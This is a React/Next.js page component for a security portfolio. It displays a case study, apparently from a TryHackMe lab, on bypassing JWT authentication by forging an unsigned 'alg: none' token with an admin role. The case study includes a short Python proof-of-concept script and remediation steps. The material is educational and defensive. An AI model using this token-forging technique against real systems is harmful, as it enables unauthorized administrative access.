"use client";
import { useParams } from "next/navigation";
import { useEffect } from "react";
import { useTerminal } from "@/context/TerminalContext";
import Link from "next/link";
import { motion } from "framer-motion";
import { ArrowLeft, FileText, Settings, Code, ShieldCheck } from "lucide-react";

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const projectDatabase: Record<string, any> = {
  "jwt-signature-validation": {
    title: "Bypassing JWT Authentication in Legacy API",
    metadata: {
      date: "Feb 14, 2026",
      severity: "Critical",
      scope: "legacy-api.local"
    },
    githubUrl: "https://github.com/OnyedikachiO/TryHackMe_Projects/blob/main/JWT%20Signature%20Validation",
    articleUrl: "https://medium.com/@yourhandle/bypassing-jwt-legacy-api", // Secondary link
    sections: {
      executiveSummary: "During a routine application penetration test, a vulnerability was discovered within a custom implementation of JSON Web Tokens (JWT). The application failed to validate the signing algorithm specified in the token header, allowing an attacker to modify the payload and forge a token as a high-privileged administrator.",
      technicalDetails: "The authentication service issues a JWT upon successful login. However, the backend validation routine relies solely on the 'alg' header parameter to determine how to verify the signature. By stripping the signature entirely and modifying the header, the backend processes the token as valid without requiring the secret key.",
      proofOfConcept: {
        filename: "exploit.py",
        code: `import base64\nimport json\n\n# 1. Create original payload\nheader = {"alg": "none", "typ": "JWT"}\npayload = {"user": "attacker", "role": "admin"}\n\n# 2. Encode without signature\nencoded_token = f"{base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')}.{base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')}."\n\nprint(f"Forged Token: {encoded_token}")`
      },
      remediation: [
        "Hardcode the expected algorithm (e.g., HS256 or RS256) in the verification library instead of trusting the token header.",
        "Reject any tokens where the algorithm is set to 'none'.",
        "Ensure the JWT library being used is up to date and patched against inherent vulnerabilities."
      ]
    }
  }
};

export default function ProjectCaseStudy() {
  const params = useParams();
  const slug = params.slug as string;
  const project = projectDatabase[slug] || projectDatabase["jwt-signature-validation"];
  const { setActiveSection } = useTerminal();

  // Lock the hierarchical terminal text statically
  useEffect(() => {
    setActiveSection(`Projects / ${project.title}`);
    
    return () => setActiveSection(null);
  }, [setActiveSection, project.title]);

  return (
    <div className="pb-20 max-w-3xl mx-auto font-secondary"> {/* Removed pt-*, px-* to defer to global layout, kept max-w-3xl for reading length */}
      
      {/* Back Navigation */}
      <motion.div initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} className="mb-8">
        <Link className="inline-flex items-center gap-2 text-sm text-gray-500 hover:text-[#10B981] transition-colors" href="/projects">
          <ArrowLeft className="w-4 h-4"/>
          Back to Projects
        </Link>
      </motion.div>

      {/* Title */}
      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
        <h1 className="text-3xl md:text-4xl font-bold text-gray-900 dark:text-white mb-6 tracking-tight">
          {project.title}
        </h1>

        {/* Action Buttons */}
        <div className="flex flex-wrap items-center gap-4 mb-10">
          {project.githubUrl && (
            <a 
              href={project.githubUrl} 
              target="_blank" 
              rel="noopener noreferrer"
              className="flex items-center gap-2 px-6 py-3 bg-gray-900 dark:bg-white text-white dark:text-gray-900 rounded-lg font-secondary text-sm font-bold hover:-translate-y-0.5 transition-transform shadow-lg shadow-black/10 dark:shadow-white/10"
            >
              <Code className="w-4 h-4"/> View Source Code
            </a>
          )}
          {project.articleUrl && (
            <a 
              href={project.articleUrl} 
              target="_blank" 
              rel="noopener noreferrer"
              className="group flex items-center gap-2 px-6 py-3 bg-transparent text-gray-600 dark:text-gray-400 border border-gray-300 dark:border-white/20 rounded-lg font-secondary text-sm font-medium hover:text-[#10B981] hover:border-[#10B981]/50 dark:hover:text-[#10B981] dark:hover:border-[#10B981]/50 transition-all"
            >
              <FileText className="w-4 h-4 group-hover:scale-110 transition-transform"/> Read Published Article
            </a>
          )}
        </div>

        {/* Metadata Banner */}
        <div className="grid grid-cols-1 md:grid-cols-3 bg-gray-50 dark:bg-[#0A0A0A] border border-gray-200 dark:border-white/10 rounded-lg mb-12 overflow-hidden">
          <div className="p-4 md:p-5 border-b md:border-b-0 md:border-r border-gray-200 dark:border-white/10">
            <span className="text-gray-500 text-xs uppercase tracking-wider block mb-1">Date</span>
            <span className="text-gray-900 dark:text-gray-300 font-medium text-sm">{project.metadata.date}</span>
          </div>
          <div className="p-4 md:p-5 border-b md:border-b-0 md:border-r border-gray-200 dark:border-white/10">
            <span className="text-gray-500 text-xs uppercase tracking-wider block mb-1">Severity</span>
            <span className="text-red-500 font-medium text-sm">{project.metadata.severity}</span>
          </div>
          <div className="p-4 md:p-5">
            <span className="text-gray-500 text-xs uppercase tracking-wider block mb-1">Scope</span>
            <span className="text-gray-900 dark:text-gray-300 font-medium text-sm">{project.metadata.scope}</span>
          </div>
        </div>
      </motion.div>

      {/* Report Body */}
      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }} className="space-y-10">
        
        {/* Executive Summary */}
        <section>
          <h2 className="flex items-center gap-2 text-lg md:text-xl font-bold text-gray-900 dark:text-white mb-3">
            <FileText className="w-5 h-5 text-[#10B981]"/>
            Executive Summary
          </h2>
          <p className="text-gray-600 dark:text-gray-300 leading-relaxed text-sm md:text-base">
            {project.sections.executiveSummary}
          </p>
        </section>

        {/* Technical Details */}
        <section>
          <h2 className="flex items-center gap-2 text-lg md:text-xl font-bold text-gray-900 dark:text-white mb-3">
            <Settings className="w-5 h-5 text-[#10B981]"/>
            Technical Details
          </h2>
          <p className="text-gray-600 dark:text-gray-300 leading-relaxed text-sm md:text-base">
            {project.sections.technicalDetails}
          </p>
        </section>

        {/* Proof of Concept */}
        <section>
          <h2 className="flex items-center gap-2 text-lg md:text-xl font-bold text-gray-900 dark:text-white mb-3">
            <Code className="w-5 h-5 text-[#10B981]"/>
            Proof of Concept
          </h2>
          <div className="w-full rounded-lg bg-gray-900 dark:bg-[#0A0A0A] border border-gray-800 dark:border-white/10 overflow-hidden mt-3">
            <div className="flex items-center px-4 py-2.5 bg-white/5 border-b border-white/10">
              <span className="text-xs font-mono text-gray-400">{project.sections.proofOfConcept.filename}</span>
            </div>
            <div className="p-4 overflow-x-auto">
              <pre className="text-xs md:text-sm font-mono text-gray-300">
                <code>{project.sections.proofOfConcept.code}</code>
              </pre>
            </div>
          </div>
        </section>

        {/* Remediation */}
        <section>
          <h2 className="flex items-center gap-2 text-lg md:text-xl font-bold text-gray-900 dark:text-white mb-3">
            <ShieldCheck className="w-5 h-5 text-[#10B981]"/>
            Remediation Steps
          </h2>
          <ul className="space-y-2.5">
            {project.sections.remediation.map((step: string, idx: number) => (
              <li key={idx} className="flex gap-3 text-gray-600 dark:text-gray-300 text-sm md:text-base leading-relaxed">
                <span className="text-[#10B981] mt-1 flex-shrink-0">•</span>
                <span>{step}</span>
              </li>
            ))}
          </ul>
        </section>

      </motion.div>
    </div>
  );
}
